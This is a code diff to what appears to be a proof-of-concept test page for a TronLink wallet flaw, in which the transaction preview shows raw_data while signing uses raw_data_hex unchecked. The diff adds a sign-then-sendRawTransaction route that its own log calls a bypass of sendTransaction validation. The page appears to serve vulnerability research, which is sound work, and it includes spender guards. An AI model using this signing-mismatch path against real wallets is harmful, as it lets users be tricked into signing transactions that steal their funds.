@@ -191,6 +191,7 @@
           <label class="mt">
             Wallet route
             <select id="signRoute">
+              <option value="tronWebSignAndSend">tronWeb.trx.sign() → sendRawTransaction ⚠️</option>
               <option value="tronWebSend">tronWeb.trx.sendTransaction(tx) — vulnerable path ⚠️</option>
               <option value="requestSign">provider.request tron_signTransaction</option>
               <option value="tronWebSign">tronWeb.trx.sign(transaction) — patched, returns {}</option>
@@ -439,7 +440,7 @@
       }
       function validateGuards(spender) {
         const route = $("signRoute").value;
-        const sendRoute = route === "requestSend" || route === "providerSend" || route === "tronWebSend";
+        const sendRoute = route === "requestSend" || route === "providerSend" || route === "tronWebSend" || route === "tronWebSignAndSend";
         if (!sameAddress(spender, state.account)) {
           const ok = $("externalSpenderAck").checked && $("externalSpenderUnlock").value.trim() === "ALLOW EXTERNAL SPENDER";
           if (!ok) throw new Error("External spender requires checkbox plus exact phrase: ALLOW EXTERNAL SPENDER");
@@ -546,7 +547,16 @@
         const route = $("signRoute").value;
         validateGuards($("spender").value.trim() || state.account);
         let result;
-        if (route === "tronWebSend") {
+        if (route === "tronWebSignAndSend") {
+          if (!state.tronWeb?.trx?.sign) throw new Error("tronWeb.trx.sign is unavailable.");
+          if (!state.tronWeb?.trx?.sendRawTransaction) throw new Error("tronWeb.trx.sendRawTransaction is unavailable.");
+          log("Step 1 — Calling tronWeb.trx.sign (popup shows raw_data)", { txID: tx.txID, rawDataType: tx.raw_data?.contract?.[0]?.type });
+          const signed = normalizeSignedResult(await state.tronWeb.trx.sign(tx));
+          log("sign() returned", signed);
+          if (!signed?.signature?.length) throw new Error("sign() returned no signature — TronLink rejected the mismatch at sign stage.");
+          log("Step 2 — Broadcasting via sendRawTransaction (bypasses sendTransaction validation)", { txID: signed.txID });
+          result = await state.tronWeb.trx.sendRawTransaction(signed);
+        } else if (route === "tronWebSend") {
           if (!state.tronWeb?.trx?.sendTransaction) throw new Error("tronWeb.trx.sendTransaction is unavailable.");
           log("Calling tronWeb.trx.sendTransaction — preview: raw_data, sign: raw_data_hex (no consistency check)", { txID: tx.txID, rawDataType: tx.raw_data?.contract?.[0]?.type });
           result = await state.tronWeb.trx.sendTransaction(tx);
